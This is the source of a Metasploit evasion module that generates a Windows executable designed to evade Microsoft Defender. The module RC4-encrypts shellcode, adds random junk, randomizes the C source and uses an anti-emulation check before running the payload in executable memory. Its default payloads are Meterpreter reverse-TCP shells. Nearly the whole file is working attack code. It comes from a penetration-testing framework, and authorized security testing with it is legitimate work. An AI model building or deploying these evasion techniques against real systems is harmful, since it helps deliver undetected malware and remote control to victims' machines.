##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'metasploit/framework/compiler/windows'

# windows_defender_exe
class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Microsoft Windows Defender Evasive Executable',
        'Description' => %q{
          This module allows you to generate a Windows EXE that evades against Microsoft
          Windows Defender. Multiple techniques such as shellcode encryption, source code
          obfuscation, Metasm, and anti-emulation are used to achieve this.

          For best results, please try to use payloads that use a more secure channel
          such as HTTPS or RC4 in order to avoid the payload network traffic getting
          caught by antivirus better.
        },
        'Author' => [
          'sinn3r',
          'RAMELLA Sébastien' # Add. x64 support.
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          ['Microsoft Windows (x86)', {
            'Arch' => ARCH_X86,
            'DefaultOptions' => {
              'PAYLOAD' => 'windows/meterpreter/reverse_tcp_rc4'
            }
          }],
          ['Microsoft Windows (x64)', {
            'Arch' => ARCH_X64,
            'DefaultOptions' => {
              'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp_rc4'
            }
          }]
        ],
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('OUTPUT_PATH', [true, 'A local directory to store the generated output (default: local_directory)', Msf::Config.local_directory]),
      OptString.new('PREFIX_FILENAME', [true, 'Prefix filename for the evasive output file (default: random)', Rex::Text.rand_text_alpha(3..10)])
    ])
    deregister_options('FILENAME')

    register_advanced_options([
      OptBool.new('KeepSrc', [true, 'If you want to keep the auto-generated source code (default: false)', false])
    ])
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
  end

  def generate_payload
    @generate_payload ||= lambda {
      opts = { format: 'rc4', key: rc4_key }
      junk = Rex::Text.rand_text(10..1024)
      p = payload.encoded + junk

      return {
        size: p.length,
        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
      }
    }.call
  end

  def c_template
    @c_template ||= %|#include <Windows.h>
#include <rc4.h>

// The encrypted code allows us to get around static scanning
#{generate_payload[:c_format]}

int main() {
  int lpBufSize = sizeof(int) * #{generate_payload[:size]};
  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
  memset(lpBuf, '\\0', lpBufSize);

  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
  // Checking NULL allows us to get around Real-time protection
  if (proc == NULL) {
    RC4("#{rc4_key}", buf, (char*) lpBuf, #{generate_payload[:size]});
    void (*func)();
    func = (void (*)()) lpBuf;
    (void)(*func)();
  }

  return 0;
}|
  end

  # Overwrite file_create for the use of this module.
  def file_create(prefix_filename, file_extension, data)
    fname = "#{prefix_filename}.#{file_extension}"
    full_path = "#{datastore['OUTPUT_PATH'].chomp('/')}/#{fname}"
    File.write(full_path, data)
    print_good "#{fname} stored at #{full_path}"
  end

  def run
    print_status("Generate code to build a unique EXE for #{target['Arch']} architecture.")
    src = Metasploit::Framework::Compiler::Windows.generate_random_c(c_template, { weight: 80 })

    # The randomized code allows us to generate a unique EXE
    case target['Arch']
    when /x86/
      prefix_filename = "#{datastore['PREFIX_FILENAME']}-x86"
      bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template, :exe, Metasm::Ia32.new)
    when /x64/
      prefix_filename = "#{datastore['PREFIX_FILENAME']}-x64"
      bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template, :exe, Metasm::X86_64.new)
    end
    file_create(prefix_filename, 'c', src) if datastore['KeepSrc']

    print_status("Compiled executable size: #{bin.length}")
    file_create(prefix_filename, 'exe', bin)
  end

end
